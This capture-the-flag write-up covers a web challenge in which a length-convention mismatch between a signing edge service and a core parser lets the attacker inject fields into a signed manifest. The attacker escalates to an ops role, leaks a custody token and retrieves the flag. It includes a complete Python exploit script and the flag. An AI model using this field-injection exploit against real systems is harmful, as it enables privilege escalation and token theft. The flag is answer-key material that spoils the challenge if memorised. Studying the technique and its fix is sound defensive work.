---
title: "Cold Dock"
description: "Frostline Edge is the only public listener. It authenticates the client, assigns a role (viewer), and forwards a sealed CCIP manifest to vaultd, the cold core. The goal is to thaw the…"
event: "cryovault"
category: "web"
categoryLabel: "Web"
tags: ["ISFCR CryoVault Finals 2026","web"]
date: "2026-10-26"
teammate: false
source: "cryovault/web/5/writeup.md"
---

**Flag:** `isfcr{9tfzw_qnsddr_87z6m_7dxngw}`

## Overview

Frostline Edge is the only public listener. It authenticates the client, assigns a
role (`viewer`), and forwards a sealed CCIP manifest to `vaultd`, the cold core.
The goal is to thaw the sealed `cold_seal` record, which requires the `ops` role.

The provided material contains:

- `docs/CCIP.md` — the vendor profile, revision **1.2**
- `docs/ccip-captures.txt` — staging frames plus a vendor conformance frame
- `edge/` — the Edge source

The important clue is that Edge builds `CCIP 1.4` frames while still using the
revision 1.2 field-length convention.

## Finding the parser differential

The revision 1.2 document defines:

> `VLEN` is the number of bytes the value occupies in the frame.

Edge implements exactly that:

```go
v := fold(value)
vlen := len(v)          // folded length
return fmt.Sprintf("%c%02x%02x%s%s", tag, len(name), vlen, name, v)
```

The vendor's self-test frame in `ccip-captures.txt` does not follow that rule.
Decoding it shows a label value `bench~6`:

```text
L0507labelbench%7E6R...
```

`bench~6` is 7 decoded bytes, but it occupies 9 frame bytes (`bench%7E6`).
Its `VLEN` is `07`, so revision 1.4 must define `VLEN` as the **unfolded
(decoded) length**, not the number of bytes in the frame.

This creates a parser differential:

- Edge signs a field with `VLEN = folded length`.
- `vaultd` reads `VLEN` as the number of **decoded** characters.

For an ordinary label the two lengths match. For every escaped byte (`%`, `.`,
`~`, and space), Edge's folded representation is 3 bytes but the decoded value is
1 byte, so `vaultd` over-reads by 2 bytes per escape.

## Turning the over-read into field injection

The Edge manifest field order is:

```text
L R U J X C T
```

The label `L` is first and the target `T` is last. If the label contains `e`
escaped bytes, Edge writes `VLEN = len(label) + 2e`, so `vaultd` consumes `2e`
bytes past the real label value.

The fixed fields after `L` have these lengths:

| Field | Length |
|---|---:|
| `R` role | 15 |
| `U` user (12-byte handle) | 21 |
| `J` jti | 24 |
| `X` exp | 18 |
| `C` custody | 28 |
| `T` header (tag, lengths, name) | 11 |
| **Total to start of target value** | **117** |

Using 59 literal `%` characters as the label gives:

- raw/decoded label length: 59
- folded frame length: 59 × 3 = 177
- over-read: 177 − 59 = 118 bytes
- 118 = 117 + 1

Therefore `vaultd` consumes the entire original `R U J X C T` header sequence
and the first byte of the target value. Parsing then resumes at offset 1 of the
target value, which is fully attacker-controlled and already covered by Edge's
HMAC.

We can put a fresh set of CCIP fields there:

```text
R0403roleops
U040cuser<handle>
J0310jti<jti>
X030aexp<unix-time>
T0609targetcold_seal
```

The original `R=viewer` field is swallowed by the label; `vaultd` sees the
injected `R=ops` instead.

## Leaking the custody token

An ops thaw of `cold_seal` also requires a valid custody field. The first
injection attempt returned:

```text
cold-chain: sealed record needs custody
```

We do not know the custody key, so `C` cannot be computed directly. However,
when the outer label over-reads into the original fields, the decoded label value
contains the original `C0710custody<16 hex>` field. For a rehearsal target such
as `dock_00`, custody is not required, and the core helpfully echoes the
consignment in its response:

```text
dock_00 thawed for <user>: consignment '...C0710custody<token>T065etargetA'
```

That leaks the genuine custody token Edge generated for this session's user.

## Final exploit

1. Open a session and obtain `dock_session`.
2. Send a request with `cold_label = "%" * 59` and a `cold_target` containing
   an injected field set with `R=ops` and `T=dock_00`.
3. Parse the custody token from the echoed consignment.
4. Send a second request with the same label trick, injecting `R=ops`,
   the leaked `C=custody`, and `T=cold_seal`.
5. The core thaws the sealed record and returns the flag.

```python
import http.cookiejar
import re
import secrets
import time
import urllib.error
import urllib.request

BASE = "https://isfcrpesu-cold-dock.chals.io"

# Keep one session: the custody token is bound to this user.
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
)
resp = opener.open(BASE + "/ops/heartbeat", timeout=20)
sess = resp.headers["Set-Cookie"].split(";")[0]
user = sess.split("=", 1)[1].split(".")[0]


def field(tag, name, value):
    return f"{tag}{len(name):02x}{len(value):02x}{name}{value}"


def thaw(injected_fields, label="%" * 59):
    body = "".join(field(*f) for f in injected_fields)
    # The first target byte is consumed by the over-reading L field.
    target = "A" + body
    cookie = f"{sess}; cold_target={target}; cold_label={label}"
    req = urllib.request.Request(
        BASE + "/ops/thaw",
        data=b"",
        method="POST",
        headers={"Cookie": cookie},
    )
    try:
        r = opener.open(req, timeout=20)
        return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def manifest_fields(role, target, exp, custody=None):
    fields = [
        ("R", "role", role),
        ("U", "user", user),
        ("J", "jti", secrets.token_hex(8)),
        ("X", "exp", f"{exp:010d}"),
    ]
    if custody is not None:
        fields.append(("C", "custody", custody))
    fields.append(("T", "target", target))
    return fields


exp = int(time.time()) + 3600

# Step 1: rehearsal target -> no custody required, and the response echoes
# the over-read L value containing Edge's genuine C field.
status, body = thaw(manifest_fields("ops", "dock_00", exp))
match = re.search(r"C0710custody([0-9a-f]{16})", body)
assert match, body
custody = match.group(1)

# Step 2: replay the leaked custody token for the sealed record.
status, body = thaw(manifest_fields("ops", "cold_seal", exp + 1, custody))
print(body)
```

Output:

```text
cold_seal thawed: isfcr{9tfzw_qnsddr_87z6m_7dxngw}
```

## Root cause

The trust boundary assumes Edge and `vaultd` implement the same CCIP revision.
Edge advertises revision 1.4 but serializes field lengths with revision 1.2
semantics. `vaultd` parses the signed bytes according to 1.4, so attacker-
controlled value bytes are reinterpreted as new signed fields. The MAC still
verifies because the injected fields are inside Edge's own manifest.

The fix would be to make Edge calculate `VLEN` as the unfolded value length, or
to pin/the manifest to the actual implemented revision rather than advertising
1.4.
